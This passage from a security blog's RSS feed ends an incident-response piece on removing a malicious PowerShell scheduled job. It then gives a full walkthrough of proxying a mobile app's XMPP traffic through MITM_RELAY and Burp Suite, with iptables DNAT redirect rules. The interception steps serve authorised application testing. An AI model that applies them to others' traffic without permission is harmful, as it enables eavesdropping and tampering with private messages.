      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image7-1024x162.png&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Knowing that this premeditated attack will ruin Christmas for an incident responder, let’s neutralise the malicious PowerShell job that has been scheduled. &lt;/p&gt;
&lt;h2&gt;Responding&lt;span class=&#34;absolute -mt-20&#34; id=&#34;responding&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#responding&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;You can remove a PowerShell scheduled job in two different ways, neither of which present a disadvantage. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#option one&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Unregister-ScheduledTask&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-TaskName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Christmas_Day&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Confirm:&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#option two&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Unregister-ScheduledJob&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Christmas_Day&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Confirm:&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image3-1024x95.png&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image12-1024x79.png&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can confirm that the malicious tasks have been eradicated from this machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image9.png&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Scheduling Security&lt;/h1&gt;&lt;p&gt;This article took inspiration from a real life attack, and examined how an adversary could abuse PowerShell scheduled Jobs to both gain persistence, and quietly dwell on a network before picking the opportune moment to strike. Scripted attacks must be proactively identified and eliminated, as automated attack chains can be speedily operated by an attacker, reducing the opportunity for defenders to respond. &lt;strong&gt;It’s important you are scouring your network for the recurring tasks that can give an attack a backdoor into your environment.&lt;/strong&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Related articles&lt;/strong&gt;: We recently wrote about how &lt;a href=&#34;https://labs.jumpsec.com/running-once-running-twice-pwned-windows-registry-run-keys/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;registry run keys&lt;/a&gt; can offer adversaries a stealthy persistence mechanism&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Detect and investigate any recurring tasks you see in your environment, and you may just catch an adversarial campaign before they can cause any damage. Deny them the pleasure of striking on Christmas Day!&lt;/p&gt;
&lt;p&gt;Any questions, comments, or criticisms please drop me a line&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt; &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dray Agha,&lt;/strong&gt; Security Researcher&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image2.png&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Burp Suite and Beyond: Exploring non-HTTP protocols using MITM_RELAY</title>
      <link>//localhost:1313/articles/2021/08/2021-08-24-burpsuite-and-beyond/</link>
      <pubDate>Tue, 24 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/08/2021-08-24-burpsuite-and-beyond/</guid>
      <description>
        
        
        &lt;p&gt;By &lt;a href=&#34;https://twitter.com/hit1t&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Muhammet Ali A&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/hit1t&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;rıtürk&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this article, Muhammet takes us on a deep technical journey to persevere beyond the limitations of the proxy tool Burp Suite, and explore non-HTTP, application-layer protocols using ‘MITM RELAY’.&lt;/p&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;As an offensive security tester, we often rely on Burp Suite. While an excellent resource when penetration testing, it’s not without limitations, as we explored in our previous article on &lt;a href=&#34;https://labs.jumpsec.com/burp-suite-python-scripter/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;utilising custom python scripts.&lt;/strong&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;To get around some particular limitations in a recent case, I used a cool tool called &lt;a href=&#34;https://github.com/jrmdev/mitm_relay&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;MITM_RELAY&lt;/strong&gt;&lt;/a&gt; which is described as a “hackish way to intercept and modify non-HTTP protocols through Burp &amp;amp; others”. &lt;/p&gt;
&lt;p&gt;This tool allows us to compensate for Burp Suite’s limitations and extend it’s proxying capabilities for protocols beyond HTTP. Let’s explore why this is important when looking to secure an application. &lt;/p&gt;
&lt;h1&gt;Simulating a man-in-the-middle&lt;/h1&gt;&lt;p&gt;Imagine &lt;strong&gt;a mobile application&lt;/strong&gt;. We’ll call it &lt;strong&gt;Alpaca App.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/alpaca_app.png&#34; alt=&#34;alpaca app&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It has loads of great features that keep you connected with your favourite Alpaca friends. Besides being cool, the mobile app needs to be &lt;strong&gt;secure&lt;/strong&gt; when you’re using it to access the big bad internet. &lt;/p&gt;
&lt;p&gt;Our task in this article is to understand if the app is broadcasting and transferring data securely or insecurely enough for an adversary to &lt;strong&gt;intercept&lt;/strong&gt; the traffic. This can also be understood as &lt;strong&gt;man-in-the-middle&lt;/strong&gt; (MITM) attack, whereby a malicious (and nosy) actor eavesdrops on the network traffic that a machine is innocently transmitting and steals or manipulates the data for their evil purposes. &lt;/p&gt;
&lt;p&gt;An important tool for MITM research involves &lt;strong&gt;proxying&lt;/strong&gt;, which acts as an intermediate between two machines - and can be weaponized for evil purposes. &lt;a href=&#34;https://portswigger.net/burp/documentation/desktop/tools/proxy/getting-started&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; is a staple tool for studying web app and mobile app communications, as it proxies the information between the client and server so we can research exactly how the application works.&lt;/p&gt;
&lt;p&gt;Definitions aside, let’s talk about the technical complications for proxying our specific mobile app. Take a big old sip of coffee, and let&amp;rsquo;s get to work.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/coffee.png&#34; alt=&#34;coffee&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;The limits of Burp Suite&lt;/h1&gt;&lt;p&gt;Burp Suite is able to catch &lt;strong&gt;HTTP&lt;/strong&gt; &lt;strong&gt;communications.&lt;/strong&gt; This is a specific application-layer protocol. The diagram below shows the process by which Burp Suite proxies communications over HTTP protocol. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/burp.png&#34; alt=&#34;burp&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;However, Burp Suite is &lt;strong&gt;ONLY&lt;/strong&gt; able to proxy this specific protocol. &lt;strong&gt;Unfortunately, Alpaca App doesn’t use HTTP to communicate. It uses XMPP instead.&lt;/strong&gt; So what now? &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Extensible Messaging and Presence Protocol (XMPP for short) is another application-layer protocol that is some decades old now, and originally went by the name &lt;strong&gt;Jabber.&lt;/strong&gt; &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Thankfully, we can use our new tool to intercept anything we want.&lt;/strong&gt; &lt;/p&gt;
&lt;h1&gt;Proxying XMPP traffic using MITM Relay&lt;/h1&gt;&lt;p&gt;As mentioned earlier, we are trying to understand whether &lt;strong&gt;Alpaca App is communicating securely.&lt;/strong&gt; Because it communicates via XMPP, we need to intercept that traffic and then study it. Let’s explain that again through a diagram: &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/xmpp.png&#34; alt=&#34;xmpp&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Not bad. So now we have a limited tool (Burp Suite) and we have a tool that can upgrade it (MITM_RELAY), so let’s get to work combining this so Burp Suite can understand Alpaca App’s XMPP!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Burp Suite has &lt;a href=&#34;https://portswigger.net/burp/documentation/desktop/tools/extender&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;its own extension&lt;/strong&gt;&lt;/a&gt; for &lt;a href=&#34;https://portswigger.net/bappstore/1d0986521ace4b2dbf0b70836efa999d&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;XMPP protocol interception&lt;/strong&gt;&lt;/a&gt;, but I didn’t find this to be as effective as the MITM_RELAY tool. &lt;/p&gt;
&lt;p&gt;The Burp XMPP extension would occasionally drop packets, which is obviously not ideal when trying to build a robust picture of the security of the app. The Burp extension, while having some good features, needed quite a bit of tinkering to make it work. &lt;/p&gt;
&lt;p&gt;In contrast, I found the MITM_RELAY tool easier to use, but really, you can use anything that you feel comfortable with!&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The &lt;a href=&#34;https://github.com/jrmdev/mitm_relay&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;creators&lt;/strong&gt;&lt;/a&gt; of the tool made a nice diagram below about how the tool works, and how to intercept different types of traffic via HTTP (Burp Suite) Proxy.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mitm.png&#34; alt=&#34;mitm&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Digging deeper, the relay server has &lt;strong&gt;three&lt;/strong&gt; &lt;strong&gt;key&lt;/strong&gt; functions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Relay Listener&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;A &lt;strong&gt;listener&lt;/strong&gt; for a specific protocol and a specific source port will &lt;strong&gt;forward&lt;/strong&gt; the traffic to our &lt;strong&gt;target IP and target PORT&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Packet Wrapper and Unwrapper&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;This component will wrap all traffic into HTTP form and deliver it to the proxy tool. When the proxy tool forwards the traffic on, it will unwrap the traffic to it’s original protocol)&lt;/li&gt;
&lt;li&gt;So XMPP &amp;mdash;&amp;raquo; HTTP &amp;mdash;&amp;raquo; XMPP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Echo Web Server&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;This web server is a required part of this. As we’re sending the request over out proxy tool there will need to be a response after we finish sending the request&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/1.png&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Let’s go through this step by step. Assume our first XMPP packet has left &lt;strong&gt;Alpaca App,&lt;/strong&gt; and was intending to reach &lt;strong&gt;Alpaca Inc.’s servers&lt;/strong&gt; out in the big internet. &lt;/p&gt;
&lt;p&gt;1. It will pass through our relay server, be wrapped in HTTP, and sent to the Proxy server (Burp Suite)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2.png&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2. After completing the wrapping-modification of the initial request, we will send it to the &lt;strong&gt;Echo Web server.&lt;/strong&gt; This will forward it to the upper level to unwrap it to the original protocol (XMPP) readying it to send to the Alpaca Inc. Server as originally intended:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3.png&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3. So far we have managed to successfully send Alpaca App’s XMPP traffic to the Alpaca Inc. server, situated on the internet. It is now the Alpaca Inc. server’s turn to answer us. Lets see how that works in return:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/4.png&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The application server then answers in the Alpaca app. We now have the ability to modify our requests to change the information we receive. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/5.png&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;4. When we are done examining Alpaca Inc.’s server response, we will let the XMPP packet go back to the client-side, (the Alpaca App). The same wrapping, unwrapping, and echo repeating occurs here to deliver the traffic back. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/6.png&#34; alt=&#34;6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So far, so good? Are you doing alright? Here’s an alpaca meme to lighten things up.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/bags.png&#34; alt=&#34;bags&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We have followed the process from the first XMPP traffic from Alpaca App on our mobile phone, through our Burp Suite-MITM_RELAY that wraps it up in HTTP, and then when it unwraps it back to XMPP and gives it the Alpaca Inc. Server - and then back again through this whole apparatus.&lt;/p&gt;
&lt;p&gt;I hope you enjoyed the visuals, and they provided some benefit. &lt;strong&gt;Let’s open up the command-line, so you can replicate this and set this up too!&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Getting hands-on!&lt;/h1&gt;&lt;p&gt;Are you ready to do this yourself? You’ll need:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/jrmdev/mitm_relay&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MITM_RELAY script&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A proxy tool&lt;/strong&gt; (Burp, in our case)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Two mobile clients:&lt;/strong&gt; talking to each other using an the app’s XMPP protocol, &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A firewall rule:&lt;/strong&gt; needed to route the traffic from mobile client to relay server.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Setting up the environment&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setting-up-the-environment&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setting-up-the-environment&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;MITM_RELAY&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mitm_relay&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mitm_relay&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;For our MITM_RELAY setup, let&amp;rsquo;s look at the parameters we need:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/params-1-1024x114.png&#34; alt=&#34;params 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-r&lt;/code&gt;:  Relaying settings. This parameter helps us to configure the relay
&lt;ul&gt;
&lt;li&gt;[local port] : [dest_host] : [dest_port]&lt;/li&gt;
&lt;li&gt;Or adding protocol: [udp:|tcp:] lport: rhost : rport&lt;/li&gt;
&lt;li&gt;Example: tcp:8083:142.250.187.238:443 &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; &lt;strong&gt;:&lt;/strong&gt; Relay listener. This is the address the relays will listen on. 
&lt;ul&gt;
&lt;li&gt;Be careful when setting this address, your relay listening address must be reachable from the client of you.&lt;/li&gt;
&lt;li&gt;And must be the same in  &amp;ndash;to&amp;ndash;destination  in iptables rule you use&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;&lt;strong&gt;:&lt;/strong&gt; The proxy parameter, in this case our proxy server will be in place&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Our MITM relay is now ready&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mitmready.png&#34; alt=&#34;mitmready&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Proxy Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;proxy-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#proxy-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We then can set up the rest of our proxy tooling and client-side Alpaca mobile app communication. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Our proxy tool (Burp Suite) is listening on &lt;strong&gt;192.168.1.184:8083&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;I am using a XMPP based chat mobile application. You, however, can choose any kind of application you would like to test. &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Firewall Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;firewall-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#firewall-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We will need to manipulate the firewall for our task. Fortunately for us, my colleague SHD already talks about how to use &lt;a href=&#34;https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;iptables&lt;/strong&gt;&lt;/a&gt; to create super specific firewall changes.&lt;/p&gt;
&lt;p&gt;Lets leverage a visual to show what we’ll need our firewall to do: &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/firewall.png&#34; alt=&#34;firewall&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Our firewall will need to do some very specific port forwarding…there are two ways to utilise &lt;strong&gt;iptables&lt;/strong&gt; to achieve this task.&lt;/p&gt;
&lt;p&gt;You can either forward one specific port on TCP/UDP for all destinations to the relay: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t nat -A OUTPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;5222&lt;/span&gt; -j DNAT --to-destination 192.168.1.184:9876&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Or you can forward one specific port on TCP/UDP for one specific destination to the relay:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -t nat -A OUTPUT -p tcp -s DEST_IP--dport &lt;span class=&#34;m&#34;&gt;5222&lt;/span&gt; -j DNAT --to-destination 192.168.1.184:9876&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;For the application you are researching, you have the task of identifying which ports to use and forward to - I unfortunately do not have the answers for your application. But I do have the answers for the Alpaca App, so let’s keep going. &lt;/p&gt;
&lt;h2&gt;Ready to start testing? &lt;span class=&#34;absolute -mt-20&#34; id=&#34;ready-to-start-testing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#ready-to-start-testing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that our environment is set up, let&amp;rsquo;s fire up our mobile application (Alpaca App) and see where the packets go.&lt;/p&gt;
&lt;h3&gt;Client to Server&lt;span class=&#34;absolute -mt-20&#34; id=&#34;client-to-server&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#client-to-server&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the top half of the screenshot (below), we can see MITM_RELAY confirm its listening configuration and then confirm it has received the new client (new connection)  that it will forward on. &lt;/p&gt;
&lt;p&gt;The lower half of the screenshot is our Burp Suite proxy tool that is receiving relay’s forwarded information.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/client_to_server.png&#34; alt=&#34;client to server&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Server to Client&lt;span class=&#34;absolute -mt-20&#34; id=&#34;server-to-client&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#server-to-client&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;And on return from the Alpaca Inc. servers, Burp Suite intercepts the communication destined for the Alpaca mobile app.  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;X-Mitm_Relay-to&lt;/strong&gt; and &lt;strong&gt;X-Mitm_Relay-From&lt;/strong&gt; indicates the changes between &lt;strong&gt;thick&lt;/strong&gt; &lt;strong&gt;client&lt;/strong&gt; and &lt;strong&gt;application&lt;/strong&gt; &lt;strong&gt;server&lt;/strong&gt; addresses dynamically, based on the where the packets come from.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/server_to_client.png&#34; alt=&#34;server to client&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;Alpaca App chat&lt;span class=&#34;absolute -mt-20&#34; id=&#34;alpaca-app-chat&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#alpaca-app-chat&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Let’s use the cool chat in the Alpaca App to send our best buddy a message.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/buddy.png&#34; alt=&#34;buddy&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This message goes from Alpaca App &amp;mdash;&amp;raquo; MITM_RELAY &amp;mdash;&amp;raquo; Burp Suite proxy. If we recall, this converts the original XMPP into HTTP, which Burp Suite can understand.&lt;/p&gt;
&lt;p&gt;We can see the intercepted contents in Burp Suite:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/intercepte.png&#34; alt=&#34;intercepte&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now we have intercepted the message in the Alpaca App chat, we can drop or forward the message further. Let’s make sure it gets through.&lt;/p&gt;
&lt;p&gt;Here we can see the actual conversation between the two mobile devices. Both are using the Alpaca App and communicating through XMPP. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/comms.png&#34; alt=&#34;comms&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;There and back again&lt;/h1&gt;&lt;p&gt;The moral of this story is that we do not have to give up on our security tooling if it has default limitations. On the contrary, we can layer up the tools we use and extend the capability of the tools that we are comfortable with. &lt;/p&gt;
&lt;p&gt;In our example, we extended Burp Suite’s HTTP-default capabilities with MITM_RELAY so we could assess the Alpaca App that uses the XMPP protocol. &lt;/p&gt;
&lt;p&gt;I hope you found this useful, and remember it next time you need to research TEXT-based traffic in Non-HTTP protocols. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Intercept everything and enjoy my friends!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/alpaca_cool.png&#34; alt=&#34;alpaca cool&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Muhammet Ali Arıtürk&lt;/strong&gt; is a Security Researcher @ JUMPSEC. &lt;/p&gt;
&lt;p&gt;You can &lt;a href=&#34;https://twitter.com/hit1t&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;follow him on Twitter&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Running Once, &lt;del&gt;Running Twice&lt;/del&gt;, Pwned! Windows Registry Run Keys</title>
      <link>//localhost:1313/articles/2021/08/2021-08-11-running-once-running-twice-pwned-windows-registry-run-keys/</link>
      <pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/08/2021-08-11-running-once-running-twice-pwned-windows-registry-run-keys/</guid>
